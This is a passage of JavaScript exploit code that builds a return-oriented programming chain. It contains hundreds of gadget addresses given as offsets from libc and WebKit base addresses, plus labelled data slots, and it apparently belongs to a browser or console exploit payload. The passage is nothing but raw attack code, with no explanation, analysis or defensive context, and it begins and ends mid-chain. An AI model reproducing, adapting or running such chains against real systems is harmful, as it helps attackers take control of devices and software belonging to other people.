db([0, 0]); // 0x0
set_gadgets([
libc_base+848070, //shl rax, cl
libc_base+764760, //pop rsi
ropchain+1060456, //L285
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+144605 //pop rdi
]);
//L285:
db([0, 0]); // 0x0
set_gadgets([
libc_base+478984, //sar edi, cl
libc_base+764760, //pop rsi
ropchain+1060568, //L287
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1060600, //L289
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1060584, //L288
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L287:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L288:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L289:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1060760, //L293
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1060712, //L290
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1060728, //L291
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L290:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L291:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L292:
db([24, 0]); // 0x18
set_gadget(libc_base+759608,); //pop rax
//L293:
db([0, 0]); // 0x0
set_gadgets([
libc_base+848070, //shl rax, cl
libc_base+764760, //pop rsi
ropchain+1060816, //L294
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+144605 //pop rdi
]);
//L294:
db([0, 0]); // 0x0
set_gadgets([
libc_base+478984, //sar edi, cl
libc_base+764760, //pop rsi
ropchain+1060928, //L296
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1060960, //L298
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1060944, //L297
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L296:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L297:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L298:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1061040, //L299
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1061056, //L300
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L299:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L300:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1061176, //L303
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1061144, //L301
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+144605 //pop rdi
]);
//L301:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
//L302:
db([4294967283, 4294967295]); // -0xd
set_gadget(libc_base+763368,); //pop rcx
//L303:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
webkit_base+1121481, //mov [rax], cl
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L305:
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1061304, //L307
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1061320, //L308
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L307:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L308:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1061464, //L312
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1061432, //L310
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1061448, //L311
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L310:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L311:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L312:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1061536, //L314
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L314:
db([0, 0]); // 0x0
set_gadgets([
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1061592, //L315
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L315:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1061688, //L318
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L317:
db([4294967284, 4294967295]); // -0xc
set_gadget(libc_base+763368,); //pop rcx
//L318:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1061776, //L320
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1061792, //L321
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L320:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L321:
db([0, 0]); // 0x0
set_gadgets([
libc_base+224145, //mov eax, [rdi]
libc_base+764760, //pop rsi
ropchain+1061952, //L324
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1061984, //L326
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1061936, //L323
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1061968, //L325
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L323:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L324:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L325:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L326:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1062112, //L328
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1062128, //L329
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1062096, //L327
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L327:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L328:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L329:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+755660, //add rax, rcx
libc_base+764760, //pop rsi
ropchain+1062216, //L331
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L331:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1062272, //L332
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L332:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1062400, //L334
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1062432, //L336
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1062416, //L335
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L334:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L335:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L336:
db([0, 0]); // 0x0
set_gadgets([
libc_base+223440, //mov al, [rdi]
libc_base+764760, //pop rsi
ropchain+1062592, //L340
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1062544, //L337
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1062560, //L338
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L337:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L338:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L339:
db([24, 0]); // 0x18
set_gadget(libc_base+759608,); //pop rax
//L340:
db([0, 0]); // 0x0
set_gadgets([
libc_base+848070, //shl rax, cl
libc_base+764760, //pop rsi
ropchain+1062648, //L341
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+144605 //pop rdi
]);
//L341:
db([0, 0]); // 0x0
set_gadgets([
libc_base+478984, //sar edi, cl
libc_base+764760, //pop rsi
ropchain+1062760, //L343
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1062792, //L345
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1062776, //L344
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L343:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L344:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L345:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1062952, //L349
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1062904, //L346
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1062920, //L347
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L346:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L347:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L348:
db([24, 0]); // 0x18
set_gadget(libc_base+759608,); //pop rax
//L349:
db([0, 0]); // 0x0
set_gadgets([
libc_base+848070, //shl rax, cl
libc_base+764760, //pop rsi
ropchain+1063008, //L350
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+144605 //pop rdi
]);
//L350:
db([0, 0]); // 0x0
set_gadgets([
libc_base+478984, //sar edi, cl
libc_base+764760, //pop rsi
ropchain+1063120, //L352
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1063152, //L354
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1063136, //L353
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L352:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L353:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L354:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1063312, //L358
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1063264, //L355
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1063280, //L356
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L355:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L356:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L357:
db([24, 0]); // 0x18
set_gadget(libc_base+759608,); //pop rax
//L358:
db([0, 0]); // 0x0
set_gadgets([
libc_base+848070, //shl rax, cl
libc_base+764760, //pop rsi
ropchain+1063368, //L359
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+144605 //pop rdi
]);
//L359:
db([0, 0]); // 0x0
set_gadgets([
libc_base+478984, //sar edi, cl
libc_base+764760, //pop rsi
ropchain+1063480, //L361
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1063512, //L363
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1063496, //L362
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L361:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L362:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L363:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1063592, //L364
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1063608, //L365
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L364:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L365:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1063768, //L369
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1063720, //L366
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1063736, //L367
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L366:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L367:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L368:
db([24, 0]); // 0x18
set_gadget(libc_base+759608,); //pop rax
//L369:
db([0, 0]); // 0x0
set_gadgets([
libc_base+848070, //shl rax, cl
libc_base+764760, //pop rsi
ropchain+1063824, //L370
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+144605 //pop rdi
]);
//L370:
db([0, 0]); // 0x0
set_gadgets([
libc_base+478984, //sar edi, cl
libc_base+764760, //pop rsi
ropchain+1063936, //L372
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1063968, //L374
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1063952, //L373
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L372:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L373:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L374:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1064064, //L376
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1064048, //L375
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L375:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L376:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1064160, //L378
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L377:
db([4294967288, 4294967295]); // -0x8
set_gadget(libc_base+763368,); //pop rcx
//L378:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1064248, //L380
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1064264, //L381
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L380:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L381:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1064408, //L385
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1064376, //L383
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1064392, //L384
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L383:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L384:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L385:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1064480, //L387
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L387:
db([0, 0]); // 0x0
set_gadgets([
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1064536, //L388
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L388:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+759608 //pop rax
]);
//L390:
db([7, 0]); // 0x7
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1064680, //L392
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L391:
db([4294967284, 4294967295]); // -0xc
set_gadget(libc_base+763368,); //pop rcx
//L392:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1064768, //L394
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1064784, //L395
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L394:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L395:
db([0, 0]); // 0x0
set_gadgets([
libc_base+224145, //mov eax, [rdi]
libc_base+764760, //pop rsi
ropchain+1064944, //L398
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1064976, //L400
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1064928, //L397
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1064960, //L399
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L397:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L398:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L399:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L400:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1065104, //L402
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1065120, //L403
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1065088, //L401
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L401:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L402:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L403:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+835093, //sub rax, rcx ; sbb rdx, rcx
libc_base+764760, //pop rsi
ropchain+1065232, //L404
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1065248, //L405
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+763368 //pop rcx
]);
//L404:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L405:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+755660, //add rax, rcx
libc_base+764760, //pop rsi
ropchain+1065336, //L407
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L407:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1065392, //L408
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L408:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1065464, //L411
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L411:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1065520, //L412
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L412:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+1121481, //mov [rax], cl
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1065624, //L415
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L414:
db([4294967283, 4294967295]); // -0xd
set_gadget(libc_base+763368,); //pop rcx
//L415:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1065712, //L417
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1065728, //L418
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L417:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L418:
db([0, 0]); // 0x0
set_gadgets([
libc_base+223440, //mov al, [rdi]
libc_base+764760, //pop rsi
ropchain+1065888, //L423
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1065840, //L420
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1065856, //L421
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L420:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L421:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L422:
db([24, 0]); // 0x18
set_gadget(libc_base+759608,); //pop rax
//L423:
db([0, 0]); // 0x0
set_gadgets([
libc_base+848070, //shl rax, cl
libc_base+764760, //pop rsi
ropchain+1065944, //L424
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+144605 //pop rdi
]);
//L424:
db([0, 0]); // 0x0
set_gadgets([
libc_base+478984, //sar edi, cl
libc_base+764760, //pop rsi
ropchain+1066056, //L426
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1066088, //L428
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1066072, //L427
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L426:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L427:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L428:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1066248, //L432
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1066200, //L429
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1066216, //L430
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L429:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L430:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L431:
db([24, 0]); // 0x18
set_gadget(libc_base+759608,); //pop rax
//L432:
db([0, 0]); // 0x0
set_gadgets([
libc_base+848070, //shl rax, cl
libc_base+764760, //pop rsi
ropchain+1066304, //L433
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+144605 //pop rdi
]);
//L433:
db([0, 0]); // 0x0
set_gadgets([
libc_base+478984, //sar edi, cl
libc_base+764760, //pop rsi
ropchain+1066416, //L435
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1066448, //L437
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1066432, //L436
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L435:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L436:
db([0, 0]); // 0x0
